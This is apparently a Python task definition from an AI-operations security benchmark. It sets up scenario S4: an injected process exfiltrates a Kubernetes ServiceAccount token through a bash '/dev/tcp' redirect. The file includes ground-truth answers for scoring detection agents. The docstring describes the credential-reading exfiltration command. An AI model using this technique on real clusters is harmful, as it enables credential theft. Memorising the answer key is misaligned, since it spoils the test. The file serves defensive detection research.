# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

"""S4 — data-exfil egress on HotelReservation, and its benign telemetry-egress twin.

A rogue transient process inside the `user` pod ships a real credential — the mounted
ServiceAccount token — out of the pod over a fresh plaintext TCP connection to an in-cluster
collector that no artifact authorises. MITRE **T1048.003** (Exfiltration Over Unencrypted Non-C2
Protocol), tactic Exfiltration, severity **CRITICAL** (``reports/DETECTION_BENCHMARK_PLAN.md``
§5.1: active exfiltration).

The single Falco rule that fires is **"Redirect STDOUT/STDIN to Network Connection in Container"**
— a STABLE-ruleset rule, so S4 needs no campaign ruleset change (unlike S7). It keys on the socket
*dup* a `> /dev/tcp/<host>/<port>` bash redirect performs, NOT on the destination, so it fires
**identically** for the attack and the benign twin and cannot tell the agent which is which. Two
consequences the reader should hold onto (see ``security_runtime.py`` for the full argument, all of
it verified against the pinned ruleset and live on a kind+Falco cluster, not recalled):

  1. The rule's own tag reads ``mitre_execution / T1059`` ("reverse shell / RCE"), NOT
     exfiltration. That is a *different* wrong label, not the answer — deliberately. The ground
     truth records the exfil technique (what the injector did); the divergence only bites the
     SEVERITY sub-question, which is scored ordinally. An agent that relays the rule's own priority
     lands on HIGH (execution) instead of CRITICAL (exfil) — the judgement S4 tests.
  2. No in-cluster sink can ever fire an ``outbound``-macro (destination-aware) rule, because every
     ClusterIP is RFC1918 and those rules exclude RFC1918 — the same wall S7 hit. The dup rule
     sidesteps it by ignoring the destination entirely.

Why it is not "cheating" (``policies/README.md`` "is this cheating?" test applied to Falco): the rule is a
DEFAULT enabled stable rule, chosen before looking at any agent, not tuned to our sink. We do not
key detection on our exfil IP.

The RQ2 twin is ``security_benign_telemetry_egress`` (in ``security_benign.py``): the SAME
mechanism and the SAME one rule, shipping innocuous uptime telemetry to a DOCUMENTED collector
(``telemetry-collector``) instead of a credential to the unlisted one (``data-collector``). The
alert is identical; the discriminators an agent can actually read are the ``proc.cmdline`` source
(the SA token path vs ``/proc/uptime``) and the destination Service. Score the two paired: an agent
that flags every outbound redirect as exfil false-positives on the twin.

Non-breaking: the rogue action is a transient one-shot `cat … > /dev/tcp/…` that reads a tiny file
and exits each cycle — no app process touched, no CPU/latency load, nothing left for `ps`. The two
sink pods are separate (see ``security_runtime.py`` for their in-cluster-only design and the note
on their own startup alerts). The injector verifies the rule actually fired before the episode
starts.
"""

from aiopslab.orchestrator.tasks.security_audit import (
    SecurityAuditDetectionTask,
    SecurityAuditLocalizationTask,
)
from aiopslab.service.apps.hotelres import HotelReservation
from aiopslab.service.kubectl import KubeCtl
from aiopslab.generators.fault.security_runtime import SecurityRuntimeInjector
from aiopslab.generators.workload.wrk import Wrk
from aiopslab.paths import TARGET_MICROSERVICES

from aiopslab.orchestrator.problems.k8s_target_port_misconfig.helpers import (
    get_frontend_url,
)


class ExfilEgressBaseTask:
    FAULT_TYPE = "exfil_egress"

    def __init__(self, faulty_service: str = "user"):
        self.app = HotelReservation()
        self.kubectl = KubeCtl()
        self.namespace = self.app.namespace
        self.faulty_service = faulty_service
        self.payload_script = (
            TARGET_MICROSERVICES
            / "hotelReservation/wrk2/scripts/hotel-reservation/mixed-workload_type_1.lua"
        )
        self.ground_truth = {
            "detected": True,
            "target_services": [faulty_service],
            "target": {"namespace": self.namespace, "workload": faulty_service},
            "opa_control": None,          # Falco-only; the spec is unchanged, OPA is blind
            # T1048.003 "Exfiltration Over Unencrypted Non-C2 Protocol" — verified at
            # attack.mitre.org (Exfiltration tactic, Linux platform). More precise than T1041,
            # which means exfil over an EXISTING C2 channel; we open a NEW plaintext channel.
            "mitre_technique": "T1048.003",
            "mitre_tactic": "Exfiltration",
            # Verified against falco-rules-5.1.0 (the deployed stable ruleset) AND observed firing
            # on a live kind+Falco 0.44.1 cluster (see security_runtime.py). The ONLY rule that
            # fires on the app pod — single signature, shared with the twin. The rule's own tag is
            # mitre_execution/T1059; the GT above records the exfil technique on purpose (see the
            # module docstring on the tag/GT divergence).
            "expected_falco_rules": [
                "Redirect STDOUT/STDIN to Network Connection in Container",
            ],
            "shared_rule_with_twin": "Redirect STDOUT/STDIN to Network Connection in Container",
            # There is NO second discriminating RULE here (both halves fire exactly the shared
            # one). The discriminator is the evidence INSIDE the shared alert — the source read and
            # the destination — recorded so scoring/analysis can check the agent used it.
            "discriminator": {"destination": "data-collector", "source_read": "serviceaccount-token"},
            "severity": "CRITICAL",       # active exfiltration — §5.1
            "detection_surface": ["falco"],
            "tier": None,
            "fault_class": "runtime-intrusion",
            # RQ2 pairing: scored together with the benign twin (precision on exfil-shaped-but-
            # legitimate egress). See security_benign.py::_BenignTelemetryEgress.
            "rq2_pair": ["security_benign_telemetry_egress"],
        }

    def start_workload(self):
        print("== Start Workload ==")
        wrk = Wrk(rate=100, dist="exp", connections=2, duration=10, threads=2)
        wrk.start_workload(
            payload_script=self.payload_script,
            url=get_frontend_url(self.app),
        )

    def inject_fault(self):
        print("== Fault Injection ==")
        injector = SecurityRuntimeInjector(namespace=self.namespace)
        injector._inject(fault_type=self.FAULT_TYPE, microservices=[self.faulty_service])

    def recover_fault(self):
        print("== Fault Recovery ==")
        injector = SecurityRuntimeInjector(namespace=self.namespace)
        injector._recover(fault_type=self.FAULT_TYPE, microservices=[self.faulty_service])


class ExfilEgressDetection(ExfilEgressBaseTask, SecurityAuditDetectionTask):
    def __init__(self, faulty_service: str = "user"):
        ExfilEgressBaseTask.__init__(self, faulty_service=faulty_service)
        SecurityAuditDetectionTask.__init__(self, self.app, self.ground_truth, mode="intrusion")


class ExfilEgressLocalization(ExfilEgressBaseTask, SecurityAuditLocalizationTask):
    def __init__(self, faulty_service: str = "user"):
        ExfilEgressBaseTask.__init__(self, faulty_service=faulty_service)
        SecurityAuditLocalizationTask.__init__(self, self.app, self.ground_truth, mode="intrusion")
